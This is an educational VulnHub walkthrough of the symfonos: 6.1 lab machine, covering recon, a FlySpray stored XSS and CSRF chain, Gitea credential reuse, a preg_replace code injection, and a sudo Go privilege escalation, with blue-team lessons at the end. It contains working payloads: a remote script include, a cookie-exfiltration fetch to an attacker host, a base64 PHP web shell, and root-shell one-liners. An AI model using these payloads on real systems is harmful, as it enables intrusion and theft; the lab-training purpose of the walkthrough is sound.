# symfonos: 6.1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
|---|---|
| Machine | symfonos: 6.1 |
| Difficulty | Intermediate |
| Author | Zayotic |
| Released | 7 April 2020 |
| VulnHub Entry | https://vulnhub.com/entry/symfonos-61,458/ |
| Download | https://vulnhub.com/entry/symfonos-61,458/#download |
| Attacker | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| Target OS | Linux (CentOS-derived) |

> The target IP used in this walkthrough is **192.168.56.101** and the attacker IP is
> **192.168.56.10**. DHCP may hand the VM a different address on your network — verify
> with `netdiscover` and adjust. Exact versions and file paths can **vary by build**, so
> treat every output below as a guide rather than gospel.

This is a great box for learning **client-side attacks** (XSS → CSRF), **credential reuse**,
and **sudo misconfiguration**. It is also the last entry in the symfonos series.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to find a host on a host-only network and enumerate its services.
- Why a **bug tracker** running old software is a juicy target.
- The difference between **reflected XSS** and **stored XSS**, and how XSS plus CSRF lets
  an attacker perform actions *as the administrator*.
- How **credential reuse** turns a leaked password into lateral movement.
- Reading an application's source code (here, a Go API and a PHP blog) to find an
  intended vulnerability instead of just running an off-the-shelf exploit.
- Escalating to root through a **sudo rule that lets you run the Go compiler as root**.

> **Why it works:** every step below abuses *trust*. A website trusts its users' input, an
> admin trusts a page they visit, and the operating system trusts a program that the admin
> marked as safe to run as root. Understanding the trust being broken is the whole lesson.

---

## 1. Reconnaissance — finding the target

First, confirm your Kali machine's IP and put it on the same host-only network as the VM.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

Now discover other hosts on that subnet. `netdiscover` sends ARP requests and listens for
replies, which is perfect on a host-only network where DHCP is in use.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: Finished!   |   Screen View: Unique Hosts
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor
 _____________________________________________________________________________
 192.168.56.1    0a:00:27:00:00:00      1      60  PCS Systemtechnik GmbH
 192.168.56.10   08:00:27:aa:bb:cc      3     180  PCS Systemtechnik GmbH
 192.168.56.101  08:00:27:11:22:33      2     120  PCS Systemtechnik GmbH
```

`192.168.56.101` is our target. Let's note it for convenience:

```bash
export ip=192.168.56.101
```

![Running netdiscover to locate the target on the host-only network](images/01-netdiscover.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Port scan

Run a full TCP scan with service and default-script detection.


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -sC -sV -p- -oN nmap-full.txt $ip
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3000/tcp open  http    Gitea (a self-hosted Git service)
3306/tcp open  mysql   MariaDB (unauthorized)
5000/tcp open  http    (custom application)
```

Ports of interest, and what they usually mean:

- **22** — SSH; only useful once we have keys or credentials.
- **80** — Apache serving a web app. Start here.
- **3000** — Gitea, a web-based Git repository manager.
- **3306** — MariaDB; likely not reachable without credentials.
- **5000** — a custom HTTP service (we will learn later it speaks JSON).

> **Why it works:** services advertise their versions. Knowing *exactly* which software and
> version is running is what lets you search for known public exploits afterwards. `-sC`
> runs safe default scripts and `-sV` fingerprints the versions; `-p-` scans all 65,535
> ports so nothing hides on a high port.

### 2.2 Web directory discovery

Port 80 shows a simple page. Let's find hidden directories.


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
gobuster dir -u http://$ip -w /usr/share/wordlists/dirb/common.txt -x php,txt
```

```text
/posts        (Status: 500)
/flyspray     (Status: 301) [--> http://192.168.56.101/flyspray/]
/server-status (Status: 403)
```

Two foreground directories appear: `/posts` (a blog that errors) and `/flyspray`.

![Gobuster output revealing /posts and /flyspray](images/02-gobuster.png)

### 2.3 Look at Gitea on port 3000

Browse to `http://192.168.56.101:3000`. Gitea shows two registered users, `achilles` and
`zayotic`, and confirms the version near the footer.

```text
Gitea Version: 1.11.4
```

> **Why it works:** knowing the exact version (1.11.4) lets us search Exploit-DB, where an
> authenticated remote-code-execution exploit for Gitea 1.1.0–1.12.5 exists. We still need
> valid credentials first — that is what the FlySpray chain gives us.

### 2.4 Explore FlySpray

Visit `http://192.168.56.101/flyspray/`. FlySpray is an open-source **bug/issue tracker**.
Registration is open, and there is a single public bug report with an admin comment.

```text
FlySpray
  Bugs: 1
  [ID 1] "Welcome" — comment by admin:
  "I will be checking this page for any updates."
```

That admin comment is the clue. The box is telling us an administrator views this page —
the perfect setup for a **stored XSS** attack.

![The FlySpray bug tracker with the admin comment](images/03-flyspray.png)

---

## 3. Foothold

### 3.1 The vulnerability: stored XSS in FlySpray 1.0-rc4

Searching Exploit-DB reveals **FlySpray 1.0-rc4 – Cross-Site Scripting / Cross-Site
Request Forgery** (EDB ID 41918). The vulnerable field is the **"Real name"** on a user's
profile. Whatever you type there is rendered unescaped when your user appears on a page.

Because an admin will view that page, we can store JavaScript that runs **in the admin's
browser** — with the admin's privileges. That is the classic path from XSS to **CSRF**
(Cross-Site Request Forgery): our script quietly submits FlySpray's "create user" form to
make a *new admin account that we control*.

> **Why it works:** the server trusts the admin's browser session cookie. When the admin
> loads the page containing our script, the browser automatically attaches that cookie to
> the form we make it submit. The server sees a legitimate admin request — because, from
> its point of view, it is one.

### 3.2 Register and plant the payload

1. Register a normal account on FlySpray, for example `user1` / `user1`.
2. Copy the exploit script (shown in EDB 41918) into a file called `script.js`. It grabs
   the current CSRF token and posts a form to create a new user.


> ### 📖 Concept — XSS and CSRF: two attacks that sound alike and are not
>
> **XSS** (Cross-Site Scripting) injects JavaScript that runs **in another user's
> browser**, with their session and their privileges. Three flavours:
>
> | Type | Where the payload lives | Danger |
> | --- | --- | --- |
> | **Reflected** | In the URL, echoed straight back | Victim must click your link |
> | **Stored** | Saved server-side (a comment, a profile field) | Runs for **every** visitor — much worse |
> | **DOM-based** | Never reaches the server; client-side JS inserts it unsafely | Invisible to server logs |
>
> ```html
> <script>alert(document.domain)</script>
> <script>fetch('http://attacker/?c='+document.cookie)</script>
> "><img src=x onerror=alert(1)>      <!-- breaks out of an HTML attribute -->
> javascript:alert(1)                 <!-- inside an href -->
> ```
>
> **Why XSS is equivalent to account takeover:** stealing an administrator's session
> cookie needs no password. And on a CMS, an admin account is remote code execution,
> because admins can edit theme and template files.
>
> **CSRF** (Cross-Site Request Forgery) is different: it makes a *logged-in* user
> perform an action they did not intend, by exploiting the fact that the browser
> attaches session cookies automatically.
>
> ```html
> <form method="post" action="http://target/wp-admin/admin-ajax.php">
>   <input type="hidden" name="username" value="admin">
>   <input type="hidden" name="action"   value="loginGuestFacebook">
>   <input type="submit" value="Login">
> </form>
> ```
>
> **The defence is a nonce** — a per-session, unpredictable token bound to the form,
> which an attacker's page cannot know. Its absence is the vulnerability.
>
> > CSRF can be far worse than "trick a user into clicking." In WP Support Plus 7.1.3
> > (Exploit-DB **41006**) the vulnerable action called WordPress's
> > `wp_set_auth_cookie()` on a username taken straight from the POST body **with no
> > password check at all** — so an *anonymous* attacker could log in as any user.
>
> **Deep dive:** [CONCEPTS §13.6 — XSS](../../docs/CONCEPTS.md#136-cross-site-scripting-xss) ·
> [§13.7 — CSRF](../../docs/CONCEPTS.md#137-csrf)

```bash
cat > script.js <<'EOF'
var csrf = document.forms[0].elements['csrftoken'].value;
// Build and submit a form that creates an admin user
var xhr = new XMLHttpRequest();
xhr.open("POST", "/flyspray/index.php?do=admin&area=newuser", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("csrftoken=" + csrf +
         "&user_name=hacker&user_pass=12345678&user_pass2=12345678" +
         "&real_name=hacker&email=hacker@hacker.com&group_in=1");
EOF
```

Serve it over HTTP so the admin's browser can fetch it:

```bash
python3 -m http.server 8000
```

Now edit your FlySpray profile and set **Real name** to a value that injects a script tag
pointing at your server. Close the existing attribute/tag so the script executes:

```text
"><script src="http://192.168.56.10:8000/script.js"></script>
```

Save the profile, then post a comment on bug **ID 1** so the admin is drawn back to a page
that renders your injected name.

### 3.3 Catch the callback and log in

Wait a minute or two. You will see a request hit your Python server:

```text
192.168.56.101 - - [..] "GET /script.js HTTP/1.1" 200 -
```

That means the admin's browser executed our script and created our account. Log out of
FlySpray and log back in with the account we made:

```text
Username: hacker
Password: 12345678
```

You are now an administrator on FlySpray.

> **Why it works:** the exploit only *worked* because the admin's browser had a valid
> session. Our script rode that session to perform privileged actions — the essence of CSRF.

### 3.4 Steal the next credential

As admin, a second bug report is now visible. It contains credentials for the Gitea
service:

```text
[ID 2] comment from zayotic:
"Gitea should be configured. achilles / h2sBr9gryBunKdF9"
```

![The admin-only bug report leaking Gitea credentials](images/04-creds.png)

Try these against SSH — it will fail, because SSH is key-only:

```bash
ssh achilles@$ip
# Permission denied (publickey)
```

But they work on **Gitea**: log in at `http://192.168.56.101:3000` as `achilles` with
password `h2sBr9gryBunKdF9`. This is **password reuse across services** — a real-world
weakness. Note that exact passwords **vary by build**.

### 3.5 Get a shell

**Path A — Gitea authenticated RCE (CVE-2020-14144).** Use the public exploit for Gitea up
to 1.12.5 (`multiple/webapps/49571.py`).

```bash
python3 49571.py -t http://$ip:3000 -u achilles -p h2sBr9gryBunKdF9 -I 192.168.56.10 -P 1337
```

**Path B — the intended path.** Inside Gitea, `achilles` owns two repositories:
`symfonos-blog` (the PHP site at `/posts`) and `symfonos-api` (the Go service on port 5000).
Reading `symfonos-blog/index.php` reveals the classic PHP `/e` modifier bug:

```php
$content = htmlspecialchars($row['text']);
echo $content;
preg_replace('/.*/e', $content, "Win");
```

`preg_replace` with the `/e` modifier **executes** the replacement string as PHP. So if we
can write text into a post, we can run code. The `symfonos-api` server on port 5000 lets
authenticated users create/update posts. Log in to the API to get a JWT, then PATCH a post:

```bash
curl -s -H "Content-Type: application/json" -X POST \
  http://$ip:5000/ls2o4g/v1.0/auth/login \
  -d '{"username":"achilles","password":"h2sBr9gryBunKdF9"}'
```


> ### 📖 Concept — JSON Web Tokens, and how they get attacked
>
> A **JWT** is three base64**url**-encoded sections joined by dots:
> **`header.payload.signature`**. Anything starting `eyJ` is almost certainly a JWT —
> `eyJ` is the base64url encoding of `{"`, the start of a JSON object.
>
> ```bash
> echo 'eyJhbGciOiJIUzI1NiJ9' | base64 -d 2>/dev/null; echo
> # {"alg":"HS256"}
> ```
>
> The **payload is only encoded, not encrypted** — read it freely. What the signature
> protects is *integrity*: the server signs header+payload with a secret so you cannot
> edit them.
>
> **The classic attacks:**
>
> | Attack | How |
> | --- | --- |
> | **`alg: none`** | Set the header algorithm to `none` and **delete the signature**. Unsigned-verification bugs accept it. |
> | **Weak HMAC secret** | The signature is `HMAC-SHA256(header.payload, secret)`. If the secret is a common word, crack it offline and forge any token. |
> | **Algorithm confusion (RS→HS)** | If the server expects RSA, switch to `HS256` and sign with the *public* key as the HMAC secret — the server verifies with the same bytes. |
> | **`kid` injection** | A key-ID pointing at a predictable path (`/dev/null`, `../../file`) makes the server "verify" with attacker-known bytes. |
> | **Claim tampering** | Change `"role":"user"` → `"admin"`, or `"sub"` to another user, then re-sign. |
>
> ```bash
> hashcat -m 16500 -a 0 token.txt rockyou.txt     # crack an HS256 JWT secret
> # or use jwt_tool to automate every attack above:
> python3 jwt_tool.py <token> -M at                 # "all tests"
> ```
>
> `-m 16500` is hashcat's mode for a JWT. A cracked secret means you can mint tokens
> for **any** user, including the administrator.
>
> **Deep dive:** [CONCEPTS §13.10 — Authentication bypass checklist](../../docs/CONCEPTS.md#1310-authentication-bypass-checklist)

```text
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6...","user":{"username":"achilles","id":1}}
```

Because the blog applies `htmlspecialchars()` before the vulnerable call, we base64-encode
our PHP payload so the forbidden characters never appear literally:

```bash
curl -s -H "Content-Type: application/json" -X PATCH \
  "http://$ip:5000/ls2o4g/v1.0/posts/1" -b "jwt=<token>" \
  -d $'{"text":"file_put_contents(\'shell.php\', base64_decode(\'PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==\'));"}'
```

Then load the blog page so `preg_replace` executes the code and drops `shell.php` into the
web root, and hit it:

```bash
curl "http://$ip/posts/shell.php?cmd=id"
```

```text
uid=48(apache) gid=48(apache) groups=48(apache)
```

Start a listener and request a reverse shell instead of `id` to get an interactive session.

> **Why it works:** the developer trusted *post content* to be harmless text. But `/e` turns
> text into **code**. The base64 trick is just a way to smuggle characters past
> `htmlspecialchars()`, which was doing encoding — not the security job it was assumed to do.

![A shell on the target as the web-server user](images/05-shell.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

### 4.1 Horizontal: become achilles

The web shell runs as `apache`. We already know `achilles`' password, and it was reused for
the Unix account too (SSH is disabled, but `su` works):

```bash
su achilles
# Password: h2sBr9gryBunKdF9
```

```text
[achilles@symfonos6 ~]$ id
uid=1000(achilles) gid=1000(achilles) groups=1000(achilles)
```

### 4.2 Vertical: achilles in the sudoers file

Check what `achilles` may run as root:


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
sudo -l
```

```text
User achilles may run the following commands on symfonos6:
    (ALL) NOPASSWD: /usr/local/go/bin/go
```

The Go toolchain can be run as root **without a password**. Go can compile and run
arbitrary programs — so we simply write a Go program that spawns a root shell.

```bash
cat > /tmp/rev.go <<'EOF'
package main

import (
    "os"
    "os/exec"
)

func main() {
    cmd := exec.Command("/bin/bash")
    cmd.Stdin = os.Stdin
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr
    cmd.Run()
}
EOF
```

Run it with sudo:

```bash
sudo /usr/local/go/bin/go run /tmp/rev.go
```

```text
root@symfonos6:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@symfonos6:/tmp# cat /root/proof.txt
Congrats on rooting symfonos:6!
```

> **Why it works:** `sudo` grants *one program* root privileges. But that program (the Go
> toolchain) is itself a general-purpose interpreter/compiler. Giving it root is the same as
> giving root to anyone who can feed it code — exactly GTFOBins-style abuse. This is why
> "let me run just this one tool as root" is almost never safe.

![Root shell and the proof file](images/06-root.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Location | Impact |
|---|---|---|---|
| 1 | Stored XSS in a profile field | FlySpray 1.0 (`Real name`) | Runs JS in admin's browser |
| 2 | Missing CSRF protection | FlySpray admin forms | Attacker creates an admin account |
| 3 | Credentials in an admin-only ticket | FlySpray bug ID 2 | Leaks Gitea credentials |
| 4 | Password reuse across services | achilles account | Lateral movement to Gitea and the OS |
| 5 | Authenticated RCE (CVE-2020-14144) | Gitea ≤ 1.12.5 | Shell as `git` |
| 6 | `preg_replace` `/e` modifier code execution | `symfonos-blog/index.php` | Shell as `apache` |
| 7 | Unsafe `sudo` rule (Go toolchain as root) | `/etc/sudoers` | Privilege escalation to root |

---

## 6. Defensive lessons (blue team)

- **Always encode output at the point of rendering, in the correct context.** A value that
  goes into an HTML attribute must be attribute-encoded; escaping once at storage time is
  not enough.
- **Add CSRF tokens to every state-changing form** and validate them server-side; set
  `SameSite=Lax` or `Strict` on session cookies.
- **Patch third-party software.** FlySpray 1.0-rc4 and Gitea 1.11.4 are old; both have
  fixes. Track versions and subscribe to advisories (Exploit-DB, NVD, vendor feeds).
- **Never reuse passwords across services.** Use a password manager and unique secrets; a
  breach on one service should not unlock another.
- **Audit `sudo` rules.** Granting a compiler/interpreter (`go`, `python`, `node`, `perl`,
  `find`, `vim`) as root is equivalent to granting a root shell. Use
  `sudo -l`, and review with tools like GTFOBins as an attacker would.
- **Run web apps as least privilege.** The web user should not be able to write into the
  web root, and should not share a password with a login account.
- **Treat `/e` in `preg_replace` as remote code execution** — it was removed in PHP 7; do
  not run end-of-life PHP (5.6 here).
- **Deploy a WAF/HIDS and review logs** for unusual callback requests and form submissions.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry — symfonos: 6.1: https://vulnhub.com/entry/symfonos-61,458/
- Exploit-DB 41918 — FlySpray 1.0-rc4 XSS/CSRF: https://www.exploit-db.com/exploits/41918
- Exploit-DB 49571 — Gitea authenticated RCE (CVE-2020-14144): https://www.exploit-db.com/exploits/49571
- CVE-2020-14144 — Gitea RCE: https://nvd.nist.gov/vuln/detail/CVE-2020-14144
- GTFOBins — `go`: https://gtfobins.github.io/gtfobins/go/
- OWASP — Cross Site Scripting: https://owasp.org/www-community/attacks/xss/
- OWASP — Cross Site Request Forgery: https://owasp.org/www-community/attacks/csrf
- PHP manual — `preg_replace` (`/e` modifier, removed in PHP 7): https://www.php.net/manual/en/function.preg-replace.php
- Ratmir Karabut — symfonos 6.1 walkthrough: https://ratmirkarabut.com/articles/vulnhub-writeup-symfonos-6-1/

---

## 8. Screenshot checklist

Capture these as you go so your own writeup has evidence:

- [ ] `images/01-netdiscover.png` — netdiscover showing the target IP.
- [ ] `images/02-gobuster.png` — gobuster finding `/posts` and `/flyspray`.
- [ ] `images/03-flyspray.png` — FlySpray with the admin comment on bug ID 1.
- [ ] `images/04-creds.png` — bug ID 2 leaking `achilles` credentials.
- [ ] `images/05-shell.png` — reverse shell as `apache`/`git`.
- [ ] `images/06-root.png` — root shell and `proof.txt`.

---

*Every command above is illustrative. The target IP, leaked passwords, and file paths can
**vary by build** — always reconfirm with your own enumeration before trusting a step.*
